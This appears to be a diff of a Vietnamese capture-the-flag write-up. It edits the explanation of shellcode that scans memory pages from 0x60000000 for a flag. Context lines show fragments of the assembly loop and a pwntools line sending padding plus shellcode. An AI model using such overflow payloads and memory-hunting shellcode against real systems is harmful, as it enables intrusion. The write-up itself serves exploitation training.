@@ -63,7 +63,7 @@ Bây giờ tạo 1 vòng lặp đi từ địa chỉ 0x60000000 về sau để t
     		cmp al,0xf2
     		je next_page        //nếu không thấy thì tìm page sau
     		jmp check
-Chuyển page rồi quay lại tìm:
+Do cơ chế cấp phát bộ nhớ theo trang (mỗi trang là 0x1000 hay 4KB) nên chỉ cần tìm các địa chỉ chia hết cho 0x1000
 
     	next_page:
     		add edi,0x1000
@@ -94,7 +94,7 @@ Kiểm tra xem địa chỉ có chứa đúng chuỗi flag:
     
     p.send(b'A'*0x3c+shellcode2)
 
-Vì lệnh `rand() << 16` luôn tạo ra địa chỉ có đuôi 0000 nên thay vì tìm theo từng trang 0x1000 (4KB) thì cũng có thể cộng 0x10000 mỗi khi không tìm thấy để tối ưu tốc độ.
+Vì lệnh `rand() << 16` luôn tạo ra địa chỉ có đuôi 0000 nên thay vì tìm theo từng trang 0x1000 thì cũng có thể cộng 0x10000 mỗi khi không tìm thấy để tối ưu tốc độ.
 # Script python
 
     #!/usr/bin/env python3
